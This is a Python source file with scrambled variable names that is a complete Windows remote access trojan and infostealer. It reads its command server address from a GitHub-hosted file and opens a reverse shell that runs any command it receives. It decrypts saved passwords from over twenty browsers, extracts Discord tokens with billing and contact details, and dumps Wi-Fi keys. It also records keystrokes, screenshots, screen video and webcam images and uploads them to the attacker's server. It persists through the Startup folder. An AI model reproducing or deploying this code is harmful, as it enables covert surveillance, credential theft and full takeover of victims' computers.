import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
JBFJsyHkFWxAwngAu = ""
xUyvIfLpZtzqEdCNeeC = ""
NzuTjKivznJbGKmivpYOmS = "04.06.25.2"
EhBLeOEqxTqcvl = True
vPLLWqkKDf = "!"
TnhGNQfkYz = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
cEPJLrNVSZARaeGPEob = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
DFMbxZYo = os.path.expanduser("~\\AppData\\Local\\")
ngfxeBchrssMkRHoC = os.path.expanduser("~\\AppData\\Roaming\\")
bDlDCowMkTkxjKFbYT = ""
ZcultRCqYXEYoyO = {
	'chrome':DFMbxZYo+'Google\\Chrome\\User Data','chromium':DFMbxZYo+'Chromium\\User Data','chrome-canary':DFMbxZYo+'Google\\Chrome SxS\\User Data',
	'msedge':DFMbxZYo+'Microsoft\\Edge\\User Data','msedge-canary':DFMbxZYo+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':DFMbxZYo+'Microsoft\\Edge Beta\\User Data','msedge-dev':DFMbxZYo+'Microsoft\\Edge Dev\\User Data',
	'avast':DFMbxZYo+'AVAST Software\\Browser\\User Data','amigo':DFMbxZYo+'Amigo\\User Data',
	'torch':DFMbxZYo+'Torch\\User Data','kometa':DFMbxZYo+'Kometa\\User Data','orbitum':DFMbxZYo+'Orbitum\\User Data',
	'cent-browser':DFMbxZYo+'CentBrowser\\User Data','7star':DFMbxZYo+'7Star\\7Star\\User Data',
	'sputnik':DFMbxZYo+'Sputnik\\Sputnik\\User Data','vivaldi':DFMbxZYo+'Vivaldi\\User Data',
	'epic-privacy-browser':DFMbxZYo+'Epic Privacy Browser\\User Data','uran':DFMbxZYo+'uCozMedia\\Uran\\User Data',
	'yandex':DFMbxZYo+'Yandex\\YandexBrowser\\User Data','brave':DFMbxZYo+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':DFMbxZYo+'Iridium\\User Data','coccoc':DFMbxZYo+'CocCoc\\Browser\\User Data',
	'opera':ngfxeBchrssMkRHoC+'Opera Software\\Opera Stable','opera-gx':ngfxeBchrssMkRHoC+'Opera Software\\Opera GX Stable'
}
def kHWObAQzGrJHlZjbrDin(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def rTfqkVdbERUxwdKezPd(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	GzGLWsgwayu = data.decode("utf-8").replace("\n","")
	if not GzGLWsgwayu.startswith(vPLLWqkKDf):
		proc = subprocess.run(GzGLWsgwayu, shell=True, capture_output=True)
		GFyCcuqTHAmZj = proc.stdout + proc.stderr
		HHRdBdLWXLuiwl(s, GFyCcuqTHAmZj)
		return
	WnOJeIKsQ = GzGLWsgwayu.split(" ")[0][1:]
	args = " ".join(GzGLWsgwayu.split()[1:]).split()
	if WnOJeIKsQ == "download":
		kcMQKHmL(s, GzGLWsgwayu)
	elif WnOJeIKsQ == "screenshot":
		CIkDnuJ(s)
	elif WnOJeIKsQ == "basename":
		HHRdBdLWXLuiwl(s, os.path.basename(__file__))
	elif WnOJeIKsQ == "update":
		fjovsoIl(s)
	elif WnOJeIKsQ == "wifi":
		XouGoJoYPvhEFFnfPe(s)
	elif WnOJeIKsQ == "screenrecord":
		kKewDVWCeSRrKdkEG(s, args)
	elif WnOJeIKsQ == "browsers":
		fQJtYaLuFUOdTLIs(s)
	elif WnOJeIKsQ == "webcam":
		BcoHAubDdcpoWhkZTxiC(s, args)
	elif WnOJeIKsQ == "cd":
		moveDirectory(s, GzGLWsgwayu[4:])
	else:
		HHRdBdLWXLuiwl(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		HHRdBdLWXLuiwl(s,"")
	except:
		HHRdBdLWXLuiwl(s, "[!] 404")
def kcMQKHmL(s, GzGLWsgwayu):
	MMYyAdgddNVR = GzGLWsgwayu.replace(vPLLWqkKDf+"download ","").split(",")
	GFyCcuqTHAmZjs = ""
	for f in MMYyAdgddNVR:
		GFyCcuqTHAmZjs += GbWzWNqnhLsVKuNbzVDg(f, "api/file/", { "type":os.path.splitext(f)[1] })
	HHRdBdLWXLuiwl(s, GFyCcuqTHAmZjs)
def CIkDnuJ(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	eVVHAlr = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(eVVHAlr)
	image.close()
	GFyCcuqTHAmZj = GbWzWNqnhLsVKuNbzVDg(eVVHAlr, "api/sscap")
	os.remove(eVVHAlr)
	HHRdBdLWXLuiwl(s, GFyCcuqTHAmZj)
def BcoHAubDdcpoWhkZTxiC(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(DFMbxZYo+fname, frame)
		cam.release()
		r=GbWzWNqnhLsVKuNbzVDg(DFMbxZYo+fname,"api/wc")
		os.remove(DFMbxZYo+fname)
		HHRdBdLWXLuiwl(s, r)
	except Exception as e:
		HHRdBdLWXLuiwl(s, "[!] 404: "+str(e))
def kKewDVWCeSRrKdkEG(s, args):
	import imageio
	from PIL import ImageGrab
	GMbclwfrC = 15
	if not args == []:
		try: GMbclwfrC = int(args[0])
		except: pass
	LrmhQjKwPrTfvXZQxzC = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	ZOoTbFoxYYhtINiPIsqvUxb = []
	fps = 11
	numFrames = GMbclwfrC * fps
	for _ in range(numFrames):
		ZOoTbFoxYYhtINiPIsqvUxb.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(LrmhQjKwPrTfvXZQxzC, ZOoTbFoxYYhtINiPIsqvUxb, fps=fps, quality=8)
	r=GbWzWNqnhLsVKuNbzVDg(LrmhQjKwPrTfvXZQxzC, "api/screc")
	os.remove(LrmhQjKwPrTfvXZQxzC)
	HHRdBdLWXLuiwl(s, r)
def GbWzWNqnhLsVKuNbzVDg(LJMplzoQ, BWEvMHkuSwQJ, QvxXsqr=None):
	import requests
	if not os.path.isfile(LJMplzoQ):
		return "[!] 404: "+LJMplzoQ+"\n"
	headers = {"user":os.getlogin()}
	if QvxXsqr is not None:
		headers = {**headers, **QvxXsqr}
	f = open(LJMplzoQ, "rb")
	requests.post("http://"+JBFJsyHkFWxAwngAu+":5555/"+BWEvMHkuSwQJ,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def HhIYIhvwtlEPa(YSOlUAwvYvlM, BWEvMHkuSwQJ):
	import requests
	if YSOlUAwvYvlM.strip() == "":
		return "[!] 204"
	requests.post("http://"+JBFJsyHkFWxAwngAu+":5555/"+BWEvMHkuSwQJ,
		data=YSOlUAwvYvlM,
		headers={"user":os.getlogin()})
	return "[+] 200"
def fjovsoIl(s):
	h, p, v = chNhZHOyga(True)
	if (v != NzuTjKivznJbGKmivpYOmS):
		KiPemUhfWNDfbPmTRVUHE(v)
		HHRdBdLWXLuiwl(s, "[+] 200")
	else:
		HHRdBdLWXLuiwl(s, "[-] 304")
def XouGoJoYPvhEFFnfPe(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		HHRdBdLWXLuiwl(s, "[!] 500")
		return
	DIhvwlNMQhBKxBE = ""
	for p in profiles:
		try: DIhvwlNMQhBKxBE+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: DIhvwlNMQhBKxBE+=f"    {p} - N/A"
	HHRdBdLWXLuiwl(s, DIhvwlNMQhBKxBE)
def KiPemUhfWNDfbPmTRVUHE(aqZgVLWIkPUTlnuJMu):
	import requests
	global EhBLeOEqxTqcvl
	PkeGVxHMaAPhVsiu = os.path.basename(__file__)
	fileType = PkeGVxHMaAPhVsiu.split(".")[-1]
	CDDzekgWxFvTghEi = PkeGVxHMaAPhVsiu.split(".")[0]+"."+aqZgVLWIkPUTlnuJMu+".pyw" if fileType.startswith("py") else ".exe"
	palkPEcWLsjhi = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), CDDzekgWxFvTghEi)
	if not os.path.isfile(palkPEcWLsjhi):
		with open(palkPEcWLsjhi, "w+") as f:
			f.write(requests.get(cEPJLrNVSZARaeGPEob+"file."+ "pyw" if palkPEcWLsjhi.split(".")[-1].startswith("py") else "exe").text)
	else:
		EhBLeOEqxTqcvl = False
def chNhZHOyga(force=False):
	global JBFJsyHkFWxAwngAu, xUyvIfLpZtzqEdCNeeC
	if force or JBFJsyHkFWxAwngAu == "" or xUyvIfLpZtzqEdCNeeC == "":
		while True:
			try:
				with urllib.request.urlopen(TnhGNQfkYz) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					JBFJsyHkFWxAwngAu = data[0].strip()
					xUyvIfLpZtzqEdCNeeC = data[1].strip()
					aqZgVLWIkPUTlnuJMu = data[2].strip()
					return JBFJsyHkFWxAwngAu, xUyvIfLpZtzqEdCNeeC, aqZgVLWIkPUTlnuJMu
			except:
				time.sleep(10)
def pWYVinUCJd():
	try:
		hsyLLKGjtBouyamcvQ = "settings.xpb"
		KSENaqnhEQNkyL = sorted([file for file in os.listdir(DFMbxZYo) if os.path.isfile(DFMbxZYo+"\\"+file) and file.endswith(hsyLLKGjtBouyamcvQ.split(".")[-1])])
		if hsyLLKGjtBouyamcvQ in KSENaqnhEQNkyL:
			KSENaqnhEQNkyL.remove(hsyLLKGjtBouyamcvQ)
		scVsApAJUjzg = os.path.join(DFMbxZYo,hsyLLKGjtBouyamcvQ)
		if len(KSENaqnhEQNkyL) > 0:
			with open(scVsApAJUjzg, "ab+") as f:
				for file in KSENaqnhEQNkyL:
					temp = os.path.join(DFMbxZYo,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		GbWzWNqnhLsVKuNbzVDg(scVsApAJUjzg, "api/log")
		if os.path.isfile(scVsApAJUjzg):
			os.remove(scVsApAJUjzg)
	except:
		pass
def GxJGqRhKuiPVZeHSgHLfZ():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(DFMbxZYo+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def aemVqHxixJWaUGKnlqr(k):
		logging.info(str(k))
	k=Listener(on_press=aemVqHxixJWaUGKnlqr)
	RJeQQpA = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in RJeQQpA:
		l.setLevel(logging.CRITICAL)
	k.start()
def fQJtYaLuFUOdTLIs(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        AopLuKKTBCAkD = "\n"
        for browser in ZcultRCqYXEYoyO:
                path = ZcultRCqYXEYoyO[browser]
                qynRysyTDgtKRxQdIK = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        qynRysyTDgtKRxQdIK = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", DFMbxZYo+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(DFMbxZYo+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        AopLuKKTBCAkD += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(qynRysyTDgtKRxQdIK, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                AopLuKKTBCAkD += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(DFMbxZYo+"\\db.db")
        FxdKaFFhpiiGYmpZXVPpt = []
        discordPaths = [ngfxeBchrssMkRHoC+'\\discord\\Local Storage\\leveldb\\',ngfxeBchrssMkRHoC+'\\discordcanary\\Local Storage\\leveldb\\',ngfxeBchrssMkRHoC+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                qynRysyTDgtKRxQdIK = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        qynRysyTDgtKRxQdIK = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(qynRysyTDgtKRxQdIK, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in FxdKaFFhpiiGYmpZXVPpt:
                                                FxdKaFFhpiiGYmpZXVPpt.append(decryptedToken)
        vylWfvPsLIvuaSVWJB = "https://discord.com/api/v9/users/@me"
        if FxdKaFFhpiiGYmpZXVPpt: AopLuKKTBCAkD +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for GGpMBwHOtVcDMGFvjPg in FxdKaFFhpiiGYmpZXVPpt:
                headers = {"Content-Type":"application/json","Authorization":GGpMBwHOtVcDMGFvjPg,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(vylWfvPsLIvuaSVWJB, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(vylWfvPsLIvuaSVWJB+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(vylWfvPsLIvuaSVWJB+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                AopLuKKTBCAkD += f"\n{user}\n{'-'*len(user)}\nToken: {GGpMBwHOtVcDMGFvjPg}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        AopLuKKTBCAkD += "\n\n"
        if not upload:
                HHRdBdLWXLuiwl(s, AopLuKKTBCAkD)
        else:
                HhIYIhvwtlEPa(AopLuKKTBCAkD, "api/google")
def HHRdBdLWXLuiwl(clientSocket, YSOlUAwvYvlM):
	formattedData = b""
	if type(YSOlUAwvYvlM) == bytes:
		formattedData += YSOlUAwvYvlM
	else:
		formattedData += bytes(YSOlUAwvYvlM, "utf-8")
	formattedData += bytes("\n"+bDlDCowMkTkxjKFbYT+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def XVZEWaKfduACGIIBiou():
	global bDlDCowMkTkxjKFbYT
	h, p, v = chNhZHOyga()
	try: pWYVinUCJd()
	except: pass
	try:
		if NzuTjKivznJbGKmivpYOmS != v:
			KiPemUhfWNDfbPmTRVUHE(v)
	except: pass
	try:
		if EhBLeOEqxTqcvl:
			fQJtYaLuFUOdTLIs(None,True)
	except: pass
	try:
		if EhBLeOEqxTqcvl:
			GxJGqRhKuiPVZeHSgHLfZ()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	bDlDCowMkTkxjKFbYT = ("(old)"if NzuTjKivznJbGKmivpYOmS!=v else "")+"["+NzuTjKivznJbGKmivpYOmS+"] "+os.getlogin()+" - "
	while True:
		XnUsKnCkwztS=False
		try:
			s=kHWObAQzGrJHlZjbrDin(h, p)
			HHRdBdLWXLuiwl(s, "")
			while not XnUsKnCkwztS:
				try: XnUsKnCkwztS=rTfqkVdbERUxwdKezPd(s)
				except Exception as e:
					HHRdBdLWXLuiwl(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
XVZEWaKfduACGIIBiou()
